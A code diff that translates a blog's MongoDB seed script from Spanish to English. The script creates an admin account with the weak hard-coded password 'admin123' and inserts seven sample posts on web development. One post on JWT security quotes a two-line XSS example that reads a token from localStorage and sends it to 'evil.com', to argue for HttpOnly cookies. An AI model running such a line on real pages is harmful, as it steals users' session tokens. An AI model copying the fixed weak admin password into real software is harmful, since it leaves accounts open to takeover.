@@ -1,15 +1,15 @@
 // ============================================================
-// Seed Script — Poblar base de datos con posts profesionales
+// Seed Script — Populate database with professional posts
 // ============================================================
 
 import mongoose from 'mongoose'
 import dotenv from 'dotenv'
 import bcrypt from 'bcryptjs'
 
-// Cargar env
+// Load env
 dotenv.config()
 
-// Schemas inline (no dependen del código principal)
+// Schemas inline
 const userSchema = new mongoose.Schema({
   username: { type: String, required: true, unique: true, lowercase: true },
   password: { type: String, required: true },
@@ -37,68 +37,65 @@ const Post = mongoose.model('Post', postSchema)
 
 async function seed() {
   const mongoUri = process.env.MONGO_URI!
-  console.log(`🔌 Conectando a ${mongoUri}...`)
+  console.log(`🔌 Connecting to ${mongoUri}...`)
   await mongoose.connect(mongoUri)
-  console.log('✅ Conectado\n')
+  console.log('✅ Connected\n')
 
-  // Limpiar datos existentes
-  console.log('🧹 Limpiando colección existente...')
+  // Clear existing data
+  console.log('🧹 Cleaning existing data...')
   await User.deleteMany({})
   await Post.deleteMany({})
 
-  // Crear admin
-  console.log('👤 Creando usuario admin...')
+  // Create admin
+  console.log('👤 Creating admin user...')
   const hashedPassword = await bcrypt.hash('admin123', 12)
   const admin = await User.create({
     username: 'admin',
     password: hashedPassword,
     role: 'admin',
   })
-  console.log('✅ Admin creado:')
+  console.log('✅ Admin created:')
   console.log('   username: admin')
   console.log('   password: admin123\n')
 
-  // Crear posts de ejemplo
-  console.log('📝 Creando posts de ejemplo...')
+  // Create posts
+  console.log('📝 Creating sample posts...')
 
   const posts = [
-    // ==============================
-    // POSTS PUBLICADOS (5)
-    // ==============================
     {
-      title: 'Clean Architecture en Node.js: Por qué importa',
+      title: 'Clean Architecture in Node.js: Why It Matters',
       slug: 'clean-architecture-nodejs',
-      content: `# Clean Architecture en Node.js: Por qué importa
+      content: `# Clean Architecture in Node.js: Why It Matters
 
-Cuando empecé a escribir código, mis aplicaciones eran un solo archivo gigante. Funcionaba, sí. Pero cuando necesitaba cambiar algo, era un quilombo.
+When I first started writing code, my applications were one giant file. It worked, sure. But when I needed to change something, it was a nightmare.
 
-## El Problema
+## The Problem
 
-Imaginá que tenés un endpoint que crea un usuario. Si la lógica de negocio, la validación, y la llamada a la base de datos están todas mezcladas en el mismo archivo, cambiás una cosa y se rompe otra.
+Imagine you have an endpoint that creates a user. If the business logic, validation, and database call are all mixed in the same file, changing one thing breaks another.
 
-## La Solución: Separar por Capas
+## The Solution: Separating by Layers
 
-Clean Architecture propone separar el código en capas con responsabilidades claras:
+Clean Architecture proposes separating code into layers with clear responsibilities:
 
 \`\`\`
 Routes → Controllers → Services → Models
 \`\`\`
 
-Cada capa solo conoce a la siguiente. Si mañana cambio MongoDB por PostgreSQL, solo modifico la capa de Models. El resto del código no se entera.
+Each layer only knows the next one. If tomorrow I switch from MongoDB to PostgreSQL, I only modify the Models layer. The rest of the code doesn't notice.
 
-## Ejemplo Práctico
+## Practical Example
 
 \`\`\`typescript
-// Service (lógica de negocio)
+// Service (business logic)
 class UserService {
   async create(data: CreateUserDTO): Promise<User> {
     const existing = await this.repository.findByEmail(data.email)
-    if (existing) throw new ConflictError('Email ya registrado')
+    if (existing) throw new ConflictError('Email already registered')
     return this.repository.create(data)
   }
 }
 
-// Controller (solo traduce HTTP → Service)
+// Controller (only translates HTTP → Service)
 class UserController {
   async create(req: Request, res: Response) {
     const user = await this.service.create(req.body)
@@ -107,26 +104,26 @@ class UserController {
 }
 \`\`\`
 
-## Conclusión
+## Conclusion
 
-No es over-engineering. Es invertir tiempo ahora para ahorrar quilombo después. Cuando el proyecto crece, los que aplicaron Clean Architecture siguen programando. Los que no, están refactorizando.
+It's not over-engineering. It's investing time now to save headaches later. When the project grows, those who applied Clean Architecture keep coding. Those who didn't are refactoring.
 
-**Lee sobre esto**: "Clean Architecture" de Robert C. Martin.`,
-      excerpt: 'Cuando empecé a escribir código, mis aplicaciones eran un solo archivo gigante. Clean Architecture resuelve eso separando por capas.',
+**Read about it**: "Clean Architecture" by Robert C. Martin.`,
+      excerpt: "When I first started writing code, my applications were one giant file. Clean Architecture solves this by separating into layers.",
       coverImage: 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200',
       status: 'published',
-      tags: ['arquitectura', 'nodejs', 'typescript'],
+      tags: ['architecture', 'nodejs', 'typescript'],
       author: admin._id,
       publishedAt: new Date('2024-01-10'),
     },
     {
-      title: 'TypeScript no es solo "agregar tipos"',
-      slug: 'typescript-mas-que-tipos',
-      content: `# TypeScript no es solo "agregar tipos"
+      title: 'TypeScript Is Not Just "Adding Types"',
+      slug: 'typescript-more-than-types',
+      content: `# TypeScript Is Not Just "Adding Types"
 
-Muchos desarrolladores piensan que TypeScript es JavaScript con tipos. Eso es como decir que React es solo "HTML con JavaScript". Es una simplificación que te hace perder lo más valioso.
+Many developers think TypeScript is JavaScript with types. That's like saying React is just "HTML with JavaScript." It's a simplification that makes you miss the most valuable parts.
 
-## Interfaces como Contratos
+## Interfaces as Contracts
 
 \`\`\`typescript
 interface APIResponse<T> {
@@ -142,7 +139,7 @@ interface User {
 }
 \`\`\`
 
-Las interfaces definen qué datos esperás. Si el backend cambia la estructura, TypeScript te avisa ANTES de que el código explote en producción.
+Interfaces define what data you expect. If the backend changes the structure, TypeScript tells you BEFORE the code explodes in production.
 
 ## Discriminated Unions
 
@@ -153,16 +150,16 @@ type Result<T> =
 
 function handleResult<T>(result: Result<T>) {
   if (result.success) {
-    // TypeScript sabe que result.data existe
+    // TypeScript knows result.data exists
     console.log(result.data)
   } else {
-    // TypeScript sabe que result.error existe
+    // TypeScript knows result.error exists
     console.error(result.error)
   }
 }
 \`\`\`
 
-## Generics para Código Reutilizable
+## Generics for Reusable Code
 
 \`\`\`typescript
 function paginate<T>(items: T[], page: number, limit: number): T[] {
@@ -171,67 +168,67 @@ function paginate<T>(items: T[], page: number, limit: number): T[] {
 }
 \`\`\`
 
-La misma función funciona con Users, Posts, Products, o cualquier array.
+The same function works with Users, Posts, Products, or any array.
 
-## Conclusión
+## Conclusion
 
-TypeScript no es burocracia. Es un sistema que detecta errores en compile time en vez de runtime. En un blog personal eso es opcional. En un proyecto profesional, es la diferencia entre dormir tranquilo y recibir llamadas a las 3 AM.`,
-      excerpt: 'Muchos piensan que TypeScript es JavaScript con tipos. Eso te hace perder lo más valioso: interfaces, discriminated unions y generics.',
+TypeScript is not bureaucracy. It's a system that detects errors at compile time instead of runtime. In a personal project that's optional. In a professional project, it's the difference between sleeping well and getting 3 AM calls.`,
+      excerpt: "Many think TypeScript is JavaScript with types. That makes you miss the most valuable: interfaces, discriminated unions and generics.",
       coverImage: 'https://images.unsplash.com/photo-1516116216624-53e697fedbea?w=1200',
       status: 'published',
-      tags: ['typescript', 'frontend', 'buenas-practicas'],
+      tags: ['typescript', 'frontend', 'best-practices'],
       author: admin._id,
       publishedAt: new Date('2024-01-20'),
     },
     {
-      title: 'Next.js App Router: SSG, ISR y Server Components',
+      title: 'Next.js App Router: SSG, ISR and Server Components',
       slug: 'nextjs-app-router',
-      content: `# Next.js App Router: SSG, ISR y Server Components
+      content: `# Next.js App Router: SSG, ISR and Server Components
 
-Cuando decidí construir este blog, tenía varias opciones: Hugo, Astro, WordPress, un SPA con React puro. Elegí Next.js 14 con App Router. Te cuento por qué.
+When I decided to build this blog, I had several options: Hugo, Astro, WordPress, or a pure React SPA. I chose Next.js 14 with App Router. Here's why.
 
-## El Problema de los SPAs
+## The Problem with SPAs
 
-React puro renderiza todo en el navegador. Eso significa:
-- El usuario ve una página en blanco mientras descarga JavaScript
-- Google no puede indexar tu contenido (mal SEO)
-- Performance pobre en móviles
+Pure React renders everything in the browser. That means:
+- The user sees a blank page while JavaScript downloads
+- Google can't index your content (bad SEO)
+- Poor performance on mobile
 
-## Server Components: El Cambio de Paradigma
+## Server Components: The Paradigm Shift
 
 \`\`\`tsx
-// Esto corre en el SERVIDOR, no en el navegador
+// This runs on the SERVER, not in the browser
 export default async function HomePage() {
-  const posts = await getPosts() // Llamada directa a la API
+  const posts = await getPosts() // Direct API call
   return <PostGrid posts={posts} />
 }
 \`\`\`
 
-Los Server Components eliminan la necesidad de useEffect + fetch + loading states. Los datos llegan pre-renderizados al navegador.
+Server Components eliminate the need for useEffect + fetch + loading states. Data arrives pre-rendered to the browser.
 
-## SSG + ISR: Lo Mejor de Dos Mundos
+## SSG + ISR: The Best of Both Worlds
 
 \`\`\`tsx
-export const revalidate = 60 // Re-genera cada 60 segundos
+export const revalidate = 60 // Re-generates every 60 seconds
 \`\`\`
 
-- **SSG**: La página se genera una vez y se cachea. Ultra-rápido.
-- **ISR**: Cada 60 segundos, se regenera silenciosamente. El usuario siempre ve contenido fresco.
+- **SSG**: The page is generated once and cached. Ultra-fast.
+- **ISR**: Every 60 seconds, it silently regenerates. The user always sees fresh content.
 
-Sin rebuild. Sin deploy. Sin downtime.
+No rebuild. No deploy. No downtime.
 
-## Cuándo No Usar Next.js
+## When NOT to Use Next.js
 
-- Apps internas sin SEO (React puro + Vite es suficiente)
-- Sitios estáticos simples (Hugo o Astro son más rápidos)
-- Proyectos donde la complejidad no justifica los beneficios
+- Internal apps without SEO (React + Vite is enough)
+- Simple static sites (Hugo or Astro are faster)
+- Projects where complexity doesn't justify the benefits
 
-## Conclusión
+## Conclusion
 
-Next.js no es la respuesta para todo. Pero para un blog o un sitio público donde SEO importa, es imbatible. El App Router de v14 hace que Server Components sean la norma, no la excepción.
+Next.js is not the answer for everything. But for a blog or public site where SEO matters, it's unbeatable.
 
-**Elegí la herramienta según el problema, no según la moda.**`,
-      excerpt: 'React puro renderiza todo en el navegador. Eso significa página en blanco, mal SEO, y performance pobre. Next.js lo resuelve.',
+**Choose the tool based on the problem, not the trend.**`,
+      excerpt: "Pure React renders everything in the browser: blank page, bad SEO, poor performance. Next.js solves all of that.",
       coverImage: 'https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=1200',
       status: 'published',
       tags: ['nextjs', 'react', 'performance'],
@@ -239,73 +236,73 @@ Next.js no es la respuesta para todo. Pero para un blog o un sitio público dond
       publishedAt: new Date('2024-02-05'),
     },
     {
-      title: 'JWT en 2024: Lo que los tutoriales no te cuentan',
-      slug: 'jwt-seguridad-real',
-      content: `# JWT en 2024: Lo que los tutoriales no te cuentan
+      title: 'JWT in 2025: What Tutorials Don\'t Tell You',
+      slug: 'jwt-security-real-world',
+      content: `# JWT in 2025: What Tutorials Don't Tell You
 
-Si seguiste cualquier tutorial de autenticación JWT, probablemente guardás el token en localStorage. Eso era aceptable en 2018. En 2024, es una vulnerabilidad.
+If you followed any JWT authentication tutorial, you probably store the token in localStorage. That was acceptable in 2018. In 2025, it's a vulnerability.
 
-## El Problema: XSS
+## The Problem: XSS
 
-Cualquier script malicioso que se inyecte en tu página puede leer localStorage:
+Any malicious script injected into your page can read localStorage:
 
 \`\`\`javascript
-// Un atacante ejecuta esto en tu página
+// An attacker runs this on your page
 const token = localStorage.getItem('jwt')
 fetch('https://evil.com/steal?token=' + token)
 \`\`\`
 
-Tu token se roba. El atacante accede a tu cuenta. Fin de la historia.
+Your token gets stolen. The attacker accesses your account. End of story.
 
-## La Solución: HttpOnly Cookies
+## The Solution: HttpOnly Cookies
 
 \`\`\`typescript
 res.cookie('auth_token', jwt, {
-  httpOnly: true,    // JavaScript no puede leerlo
-  sameSite: 'strict', // Solo se envía en tu dominio
-  secure: true,       // Solo HTTPS en producción
-  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 días
+  httpOnly: true,    // JavaScript can't read it
+  sameSite: 'strict', // Only sent on your domain
+  secure: true,       // HTTPS only in production
+  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
 })
 \`\`\`
 
-El browser guarda la cookie, pero JavaScript NO puede acceder a ella. El XSS pierde poder.
+The browser stores the cookie, but JavaScript CANNOT access it. XSS loses its power.
 
-## SameSite: La Capa Extra
+## SameSite: The Extra Layer
 
-\`SameSite: 'strict'\` significa que la cookie solo se envía cuando navegás dentro de tu dominio. Un atacante que intente hacer un request desde otro sitio no recibirá tu cookie.
+\`SameSite: 'strict'\` means the cookie is only sent when navigating within your domain. An attacker trying to make a request from another site won't receive your cookie.
 
-## Refresh Tokens: ¿Necesarios?
+## Refresh Tokens: Necessary?
 
-Para un blog con 1 admin: No. Un JWT de 7 días es suficiente.
-Para una app bancaria: Sí. JWT corto (15 min) + refresh token rotativo.
+For a blog with 1 admin: No. A 7-day JWT is enough.
+For a banking app: Yes. Short JWT (15 min) + rotating refresh tokens.
 
-## Conclusión
+## Conclusion
 
-La seguridad no es opcional. Lo que aprendés en tutoriales de YouTube tiene fecha de vencimiento. Investigá, actualizá tus prácticas, y no copies código sin entender las implicancias.
+Security is not optional. What you learn in YouTube tutorials has an expiration date. Research, update your practices, and don't copy code without understanding the implications.
 
-**Si tu blog tiene JWT en localStorage, un atacante puede publicar en tu nombre.**`,
-      excerpt: 'Si seguiste cualquier tutorial JWT, probablemente guardás el token en localStorage. En 2024, eso es una vulnerabilidad.',
+**If your blog stores JWT in localStorage, an attacker can post in your name.**`,
+      excerpt: "If you followed any JWT tutorial, you probably store the token in localStorage. In 2025, that's a vulnerability.",
       coverImage: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=1200',
       status: 'published',
-      tags: ['seguridad', 'jwt', 'nodejs'],
+      tags: ['security', 'jwt', 'nodejs'],
       author: admin._id,
       publishedAt: new Date('2024-02-15'),
     },
     {
-      title: 'Zustand vs Redux: ¿Por qué elegí lo simple?',
+      title: 'Zustand vs Redux: Why I Chose Simplicity',
       slug: 'zustand-vs-redux',
-      content: `# Zustand vs Redux: ¿Por qué elegí lo simple?
+      content: `# Zustand vs Redux: Why I Chose Simplicity
 
-En mis primeros proyectos usé Redux. Funcionaba, pero cada feature nueva requería:
-- Crear un slice
-- Crear actions
-- Crear reducers
-- Configurar el store
-- Agregar el Provider al root
+In my early projects, I used Redux. It worked, but every new feature required:
+- Creating a slice
+- Creating actions
+- Creating reducers
+- Configuring the store
+- Adding the Provider to the root
 
-Eran 5 archivos para manejar un booleano de "isSidebarOpen".
+That's 5 files just to manage a boolean like "isSidebarOpen."
 
-## Zustand: State Management sin Boilerplate
+## Zustand: State Management Without Boilerplate
 
 \`\`\`typescript
 import { create } from 'zustand'
@@ -337,7 +334,7 @@ export const useAuthStore = create<AuthState>((set) => ({
 }))
 \`\`\`
 
-Un archivo. Sin Provider. Sin boilerplate. Y tiene persistencia automática:
+One file. No Provider. No boilerplate. And it has automatic persistence:
 
 \`\`\`typescript
 export const useAuthStore = create(
@@ -348,70 +345,66 @@ export const useAuthStore = create(
 )
 \`\`\`
 
-## ¿Cuándo usar Redux?
+## When to Use Redux
 
-- Apps con +50 acciones y middleware complejo
-- Teams grandes que necesitan convenciones estrictas
-- Proyectos que ya tienen Redux (no migres por gusto)
+- Apps with 50+ actions and complex middleware
+- Large teams that need strict conventions
+- Projects already using Redux (don't migrate for fun)
 
-## Conclusión
+## Conclusion
 
-Redux es poderoso. Pero para el 90% de los proyectos, Zustand es suficiente. No uses un framework enterprise para una app que tiene 3 stores.
+Redux is powerful. But for 90% of projects, Zustand is enough. Don't use an enterprise framework for an app with 3 stores.
 
-**La mejor herramienta es la que resuelve tu problema sin crear nuevos.**`,
-      excerpt: 'Redux requería 5 archivos para manejar un booleano. Zustand resuelve lo mismo en un archivo sin boilerplate.',
+**The best tool is the one that solves your problem without creating new ones.**`,
+      excerpt: "Redux required 5 files to manage a boolean. Zustand solves the same thing in one file without boilerplate.",
       coverImage: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=1200',
       status: 'published',
       tags: ['react', 'state-management', 'zustand'],
       author: admin._id,
       publishedAt: new Date('2024-03-01'),
     },
-
-    // ==============================
-    // POSTS EN BORRADOR (2)
-    // ==============================
     {
-      title: 'API REST vs GraphQL: ¿Cuándo usar cada uno?',
+      title: 'REST vs GraphQL: When to Use Each One',
       slug: 'rest-vs-graphql',
-      content: `# API REST vs GraphQL: ¿Cuándo usar cada uno?
+      content: `# REST vs GraphQL: When to Use Each One
 
-Estoy preparando un artículo comparando REST y GraphQL con ejemplos reales. Spoiler: no hay uno mejor que otro. Depende del caso de uso.
+I'm preparing an article comparing REST and GraphQL with real examples. Spoiler: there's no "better" one. It depends on the use case.
 
-## Temas que voy a cubrir:
+## Topics I'll Cover:
 
-- Over-fetching y under-fetching
-- Type safety en GraphQL
-- REST con TypeScript DTOs
-- Performance comparativa
-- Casos de uso reales
+- Over-fetching and under-fetching
+- Type safety in GraphQL
+- REST with TypeScript DTOs
+- Performance comparison
+- Real-world use cases
 
-[Artículo en progreso]`,
-      excerpt: 'Comparando REST y GraphQL con ejemplos reales. Depende del caso de uso.',
+[Article in progress]`,
+      excerpt: 'Comparing REST and GraphQL with real examples. It depends on the use case.',
       coverImage: 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=1200',
       status: 'draft',
-      tags: ['api', 'backend', 'comparativa'],
+      tags: ['api', 'backend', 'comparison'],
       author: admin._id,
     },
     {
-      title: 'Docker para Desarrollo: Más allá del "docker run"',
-      slug: 'docker-desarrollo',
-      content: `# Docker para Desarrollo: Más allá del "docker run"
+      title: 'Docker for Development: Beyond "docker run"',
+      slug: 'docker-for-development',
+      content: `# Docker for Development: Beyond "docker run"
 
-Quiero escribir sobre cómo usar Docker efectivamente en desarrollo local. No solo correr containers, sino orquestar tu stack completo.
+I want to write about how to use Docker effectively in local development. Not just running containers, but orchestrating your entire stack.
 
-## Temas planeados:
+## Planned Topics:
 
-- Docker Compose para full-stack apps
-- Hot reload con volumes
-- Networking entre containers
-- Optimización de imágenes multi-stage
-- Trucos para Windows (que es mi entorno)
+- Docker Compose for full-stack apps
+- Hot reload with volumes
+- Networking between containers
+- Multi-stage image optimization
+- Windows tips (my environment)
 
-[Borrador - próximamente]`,
-      excerpt: 'Cómo usar Docker efectivamente en desarrollo local, más allá del docker run básico.',
+[Draft - coming soon]`,
+      excerpt: 'How to use Docker effectively in local development, beyond basic docker run.',
       coverImage: 'https://images.unsplash.com/photo-1605745341112-85968b19335b?w=1200',
       status: 'draft',
-      tags: ['docker', 'devops', 'desarrollo'],
+      tags: ['docker', 'devops', 'development'],
       author: admin._id,
     },
   ]
@@ -425,19 +418,19 @@ Quiero escribir sobre cómo usar Docker efectivamente en desarrollo local. No so
   const published = posts.filter((p) => p.status === 'published').length
   const drafts = posts.filter((p) => p.status === 'draft').length
 
-  console.log('\n🎉 Seed completado!')
-  console.log(`\n📋 Resumen:`)
-  console.log(`   - 1 usuario admin (admin / admin123)`)
-  console.log(`   - ${published} posts publicados`)
-  console.log(`   - ${drafts} posts en borrador`)
+  console.log('\n🎉 Seed completed!')
+  console.log(`\n📋 Summary:`)
+  console.log(`   - 1 admin user (admin / admin123)`)
+  console.log(`   - ${published} published posts`)
+  console.log(`   - ${drafts} draft posts`)
   console.log(`\n   🌐 Blog: http://localhost:3000`)
   console.log(`   🔧 Admin: http://localhost:3000/admin/login`)
 
   await mongoose.disconnect()
-  console.log('\n🔌 Desconectado de MongoDB')
+  console.log('\n🔌 Disconnected from MongoDB')
 }
 
 seed().catch((error) => {
-  console.error('❌ Error en seed:', error)
+  console.error('❌ Seed error:', error)
   process.exit(1)
 })
